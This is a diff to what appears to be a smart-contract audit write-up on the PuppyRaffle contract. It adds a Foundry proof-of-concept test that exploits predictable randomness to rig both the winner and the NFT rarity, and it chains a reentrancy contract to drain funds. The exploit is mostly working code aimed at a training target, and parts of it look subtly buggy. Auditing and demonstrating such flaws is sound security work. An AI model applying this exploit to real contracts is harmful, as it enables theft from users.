@@ -168,7 +168,7 @@ uint256 winnerIndex =
 Moreover, the value of the minted item is also based on predictable or controllable data:
 
 <details>
-<summary>PoC</summary>
+<summary>Vulnerable code - 2</summary>
 
 ```javascript
 uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
@@ -187,13 +187,153 @@ Critical - Malicous user can
 
 <details>
 <summary>PoC</summary>
+NOTE: This PoC uses code from reentrancy previous chapter.
 
 ```javascript
-uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
-   
-        
-        
+   function testRandonNumberSelectWinner() public {
 
+        // Stage 0: Start to record logs and start raffle than wait to raffle end
+        // That imitates malicious user who monitors the logs and tries to exploit the system
+        vm.recordLogs();
+        // Users enter the raffle
+        address[] memory players1 = new address[](3);
+        players1[0] = playerOne;
+        players1[1] = playerTwo;
+        players1[2] = playerThree;
+        
+        puppyRaffle.enterRaffle{value: entranceFee * 3}(players1);
+
+        address[] memory players2 = new address[](2);
+        players2[0] = playerFour;
+        players2[1] = address(5);
+
+        puppyRaffle.enterRaffle{value: entranceFee * 2}(players2);
+
+        // CHAIN 1: deploy reentrancy contract and add it later to the raffle 
+        ReentrancyContract reentrancyContract = new ReentrancyContract{value: entranceFee}(address(puppyRaffle), attacker, 0);
+
+        // DEBUG: check logs
+        // Retrieve the recorded logs
+        Vm.Log[] memory logs = vm.getRecordedLogs();
+        uint256 playerCount = getPlayerCount( logs );
+
+        // RAFFLE OVER
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+        // -----------------
+
+        // To arrays of legit players and one malicious reentrancy
+        assertEq(playerCount, players1.length + players2.length + 1, "Player count does not match the expected value");
+
+        // Stage 1: Count address that always will generate legendary item 
+        address legendaryAddress = findLegendaryAddress();
+
+        // Stage 2:Predict how many address add to  became a winner
+        uint attackerIndex = playerCount; // The attacker is the last player and we counting from 0, I added it to make it clear
+
+        
+        // Winner prediction 
+        uint256 playersNeeded = predictPlayersNeeded(attackerIndex, legendaryAddress);
+        // Attacker gets founds for attack (flashLoan or anything)
+        assertEq(address(attacker).balance, 0, "Attacker balance should be 0");
+        deal(attacker, puppyRaffle.entranceFee() * playersNeeded);
+
+        // Attacker is founding legendary account
+        vm.prank(attacker);
+        // We are delaing a lot of ETH as attack might be expensive
+        payable(legendaryAddress).transfer(puppyRaffle.entranceFee() * playersNeeded);
+        assertLe(puppyRaffle.entranceFee() * playersNeeded, address(legendaryAddress).balance, "Legendary address did not receive the funds");
+        
+        //deal(legendaryAddress, puppyRaffle.entranceFee() * playersNeeded);
+        vm.startPrank(legendaryAddress);
+
+        // Stage 3: Add the necessary number of players to the raffle
+        uint256 playersNeededToBeAdd = playersNeeded - playerCount ;
+        address[] memory maliciousAddresses = new address[](playersNeededToBeAdd);
+        maliciousAddresses[0] = legendaryAddress;   
+        
+        // // Add the necessary number of players to the raffle
+        for (uint256 p = 2; p < playersNeededToBeAdd; p++) {
+            address playerAddress = address( uint160(p+100) );
+            maliciousAddresses[p] = playerAddress;   
+        }
+
+        puppyRaffle.enterRaffle{value: entranceFee * (playersNeededToBeAdd)} (maliciousAddresses);
+        vm.stopPrank();
+
+        // CHAIN 2: reentrancy contract attack - attack must be stoped before needed prize will be drained
+        vm.startPrank(attacker);
+        uint256 totalAmountCollected = entranceFee * (playersNeeded);
+        uint256 prizePool = (totalAmountCollected * 80) / 100 +1;
+        reentrancyContract.setDrainEdge( prizePool + entranceFee);
+        reentrancyContract.attack();
+        vm.stopPrank();
+
+        // Stage 4: Select the winner
+        vm.prank(legendaryAddress);
+        puppyRaffle.selectWinner();
+
+        // Check if attack succeded
+        // Legendary address should be the winner
+        assertEq(puppyRaffle.previousWinner(), legendaryAddress);
+        // Legendary address should have the legendary prize
+        uint256 tokenId = puppyRaffle.tokenOfOwnerByIndex(legendaryAddress, 0); // We can assume that this is only attacker's token for test purpse 
+        uint256 rarity = puppyRaffle.tokenIdToRarity(tokenId);// Take rarity of stolen token
+        uint256 LEGENDARY_RARITY = puppyRaffle.LEGENDARY_RARITY();
+        assertEq(rarity, LEGENDARY_RARITY, "Legendary address did not receive a legendary rarity token");
+        // Transfer the token from the legendary address to the attacker
+        vm.prank(legendaryAddress);
+        puppyRaffle.transferFrom(legendaryAddress, attacker, tokenId);
+
+        // Verify the transfer
+        address newOwner = puppyRaffle.ownerOf(tokenId);
+        assertEq(newOwner, attacker, "Token was not transferred to the attacker");
+    }
+
+    function predictPlayersNeeded(uint _attackerIndex, address _attacker) public view returns (uint256 _playerCount) {
+        // As this is minium number of players there is no need to iterate from 0
+        uint256 playerCount = 4;
+        while (true) {
+            uint256 winnerIndex = uint256(keccak256(abi.encodePacked(_attacker, block.timestamp,block.difficulty))) % (playerCount);
+            if (winnerIndex == _attackerIndex) {
+                return playerCount;
+            }
+            playerCount++;
+        }
+    }
+    
+    function getPlayerCount(Vm.Log[] memory logs) public pure returns (uint256) {
+        uint256 playerCount = 0;
+        for (uint256 j = 0; j < logs.length; j++) {
+            if (logs[j].topics[0] == keccak256("RaffleEnter(address[])")) {
+                // Decode the data to get the player addresses
+                address[] memory newPlayers = abi.decode(logs[j].data, (address[]));
+                playerCount += newPlayers.length;
+            }
+        }
+        return playerCount;
+}
+
+    function findLegendaryAddress() public view returns (address _legendaryAddress) {
+        uint256 rareThreshold = puppyRaffle.RARE_RARITY();
+        uint256 commonThreshold = puppyRaffle.COMMON_RARITY();
+        uint256 legendaryThreshold = rareThreshold + commonThreshold + 1;
+
+        address legendaryAddress;
+        uint256 rarity;
+        uint256 i = 0;
+        while (true) {
+            rarity = uint256(keccak256(abi.encodePacked(legendaryAddress, block.difficulty))) % 100;
+            if (rarity > legendaryThreshold) {
+                break;
+            }
+            legendaryAddress = address(uint256(keccak256(abi.encodePacked(i, block.difficulty))));
+            i++;
+        }
+        console.log("Legendary address found after ", i, " iterations");
+        return legendaryAddress;
+}
+   
 ```
 </details>
 
